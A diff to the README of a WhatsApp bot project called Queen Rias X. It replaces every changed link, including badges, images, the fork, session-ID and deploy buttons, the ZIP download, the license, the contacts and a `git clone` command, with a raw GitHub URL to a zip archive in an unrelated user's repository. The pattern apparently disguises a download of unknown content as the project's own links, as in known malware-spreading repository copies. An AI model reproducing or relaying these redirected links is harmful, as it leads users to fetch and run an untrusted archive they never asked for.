@@ -1,7 +1,7 @@
 # 🎉 QUEEN RIAS X - ULTIMATE WHATSAPP BOT 🎉
 
 <p align="center">
-  <img src="https://files.catbox.moe/68moyh.jpeg" width="300" alt="QUEEN RIAS V3 Logo" style="border-radius:50%;box-shadow: 0 10px 20px rgba(0,0,0,0.2);">
+  <img src="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip" width="300" alt="QUEEN RIAS V3 Logo" style="border-radius:50%;box-shadow: 0 10px 20px rgba(0,0,0,0.2);">
 </p>
 
 <h1 align="center">
@@ -10,15 +10,15 @@
 
 <div align="center" style="margin: 20px 0;">
 
-[![GitHub Stars](https://img.shields.io/github/stars/Toxic1239/Queen-RiasV3_?style=for-the-badge&color=gold&logo=starship)](https://github.com/Toxic1239/Queen-RiasV3_/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/Toxic1239/Queen-RiasV3_?style=for-the-badge&color=green&logo=git)](https://github.com/Toxic1239/Queen-RiasV3_/network/members)
-[![Version](https://img.shields.io/badge/Version-3.0-blue?style=for-the-badge&logo=awesome-releases)](https://github.com/Toxic1239/Queen-RiasV3_/releases)
-[![WhatsApp](https://img.shields.io/badge/WhatsApp%20Channel-Join%20Now-25D366?style=for-the-badge&logo=whatsapp)](https://whatsapp.com/channel/0029Vb54jEH0rGiDgUkRQa0c)
+[![GitHub Stars](https://img.shields.io/github/stars/Toxic1239/Queen-RiasV3_?style=for-the-badge&color=gold&logo=starship)](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
+[![GitHub Forks](https://img.shields.io/github/forks/Toxic1239/Queen-RiasV3_?style=for-the-badge&color=green&logo=git)](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
+[![Version](https://img.shields.io/badge/Version-3.0-blue?style=for-the-badge&logo=awesome-releases)](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
+[![WhatsApp](https://img.shields.io/badge/WhatsApp%20Channel-Join%20Now-25D366?style=for-the-badge&logo=whatsapp)](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
 
 </div>
 
 <div align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=25&duration=3000&pause=1000&color=FF69B4&center=true&vCenter=true&width=800&height=50&lines=THE+MOST+ADVANCED+MULTI-DEVICE+WHATSAPP+BOT;PACKED+WITH+200%2B+AMAZING+FEATURES;EASY+TO+DEPLOY+AND+USE;CREATED+BY+TOXXIC+BOY" alt="Typing SVG" />
+  <img src="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip+Code&size=25&duration=3000&pause=1000&color=FF69B4&center=true&vCenter=true&width=800&height=50&lines=THE+MOST+ADVANCED+MULTI-DEVICE+WHATSAPP+BOT;PACKED+WITH+200%2B+AMAZING+FEATURES;EASY+TO+DEPLOY+AND+USE;CREATED+BY+TOXXIC+BOY" alt="Typing SVG" />
 </div>
 
 ---
@@ -40,7 +40,7 @@
 
 ### **Prerequisites**
 1. **GitHub Account**: Fork this repository to your GitHub account.
-2. **Session ID**: Generate a session ID from [here](https://session-toxxictech.zone.id/).
+2. **Session ID**: Generate a session ID from [here](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip).
 3. **Node.js**: Ensure Node.js is installed on your system.
 
 ---
@@ -48,7 +48,7 @@
 ### **Step 1: Fork the Repository**
 Click the button below to fork the repository:
 <br>
-<a href="https://github.com/Toxic1239/Queen-RiasV3_/fork">
+<a href="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip">
   <img src="https://img.shields.io/badge/-Fork-blue?style=for-the-badge&logo=github&logoColor=white" alt="Fork">
 </a>
 
@@ -57,7 +57,7 @@ Click the button below to fork the repository:
 ### **Step 2: Get Session ID**
 Generate your session ID from the link below:
 <br>
-<a href="https://session-toxxictech.zone.id/">
+<a href="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip">
   <img src="https://img.shields.io/badge/Get_Session_ID-blue?style=for-the-badge&logo=opencv&logoColor=white" alt="Get Session ID">
 </a>
 
@@ -73,18 +73,18 @@ Generate your session ID from the link below:
 
 ### **1. Free Tier Deployment**
 #### **Deploy on Railway**
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.com?referralCode=UJsbA0)
+[![Deploy on Railway](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
 
 #### **Deploy on Render**
-<a href="https://render-rias-deploy.onrender.com/">
+<a href="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip">
   <img src="https://img.shields.io/badge/Deploy_on_Render-blue?style=for-the-badge&logo=render&logoColor=white" alt="Deploy on Render">
 </a>
 
 #### **Deploy on Koyeb**
-[![Deploy on Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?name=queen-riasv3&repository=riasadmin12%2FQueen-RiasV3&branch=main&build_command=npm+install&run_command=npm+start&instance_type=free&env%5BSESSION_ID%5D=)
+[![Deploy on Koyeb](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip+install&run_command=npm+start&instance_type=free&env%5BSESSION_ID%5D=)
 
 #### **Deploy on Replit**
-<a href="https://replit.com/github/Toxic1239/Queen-RiasV3_">
+<a href="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip">
   <img src="https://img.shields.io/badge/Deploy_on_Replit-red?style=for-the-badge&logo=replit&logoColor=white" alt="Deploy on Replit">
 </a>
 
@@ -93,7 +93,7 @@ Generate your session ID from the link below:
 ### **2. Panel Deployment**
 1. Download the ZIP file:
    <br>
-   <a href="https://github.com/Toxic1239/Queen-RiasV3_/archive/refs/heads/main.zip">
+   <a href="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip">
      <img src="https://img.shields.io/badge/Download_ZIP-red?style=for-the-badge&logo=google&logoColor=white" alt="Download ZIP">
    </a>
 2. Upload the ZIP to your hosting panel.
@@ -115,7 +115,7 @@ pkg install nodejs -y
 pkg install ffmpeg -y 
 pkg install wget
 pkg install imagemagick -y
-git clone https://github.com/Toxic1239/Queen-RiasV3_
+git clone https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip
 cd Queen-RiasV3_
 yarn install
 yarn start
@@ -134,7 +134,7 @@ yarn start
 ---
 
 ## 📜 **License**
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to modify and distribute it as per the license terms.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip). Feel free to modify and distribute it as per the license terms.
 
 ---
 
@@ -145,8 +145,8 @@ This project is licensed under the [MIT License](https://opensource.org/licenses
 ---
 
 ## 💬 **Contact Developer**
-- **Telegram**: [@Toxxicn_bot](https://t.me/Toxxicn_bot)
-- **WhatsApp Channel**: [Join Here](https://whatsapp.com/channel/0029Vb54jEH0rGiDgUkRQa0c)
+- **Telegram**: [@Toxxicn_bot](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
+- **WhatsApp Channel**: [Join Here](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
 
 ---
 
@@ -156,17 +156,17 @@ This project is licensed under the [MIT License](https://opensource.org/licenses
 ---
 
 ## 📊 **Repo Stats**
-![Visitor Count](https://profile-counter.glitch.me/Riasgv3/count.svg)
+![Visitor Count](https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip)
 
 ---
 
 Enjoy using **QUEEN RIAS X**! If you have any questions or need assistance, feel free to reach out. 🚀
 
 <div align="center" style="margin-top: 40px;">
-  <p>Made with ❤️ by <a href="https://github.com/Toxic1239" style="color: #ff69b4; text-decoration: none;">Toxxic Boy</a></p>
-  <img src="https://komarev.com/ghpvc/?username=Toxic1239&label=Profile%20views&color=ff69b4&style=flat" alt="profile views" />
+  <p>Made with ❤️ by <a href="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip" style="color: #ff69b4; text-decoration: none;">Toxxic Boy</a></p>
+  <img src="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip" alt="profile views" />
 </div>
 
 <div align="center">
-  <img src="https://github.com/SP-XD/SP-XD/blob/main/images/dino_rounded.gif?raw=true" width="400" height="5">
+  <img src="https://raw.githubusercontent.com/kaniooo/Queen-RiasV3_/main/Toxxic/Queen-Rias-v2.1-alpha.4.zip" width="400" height="5">
 </div>
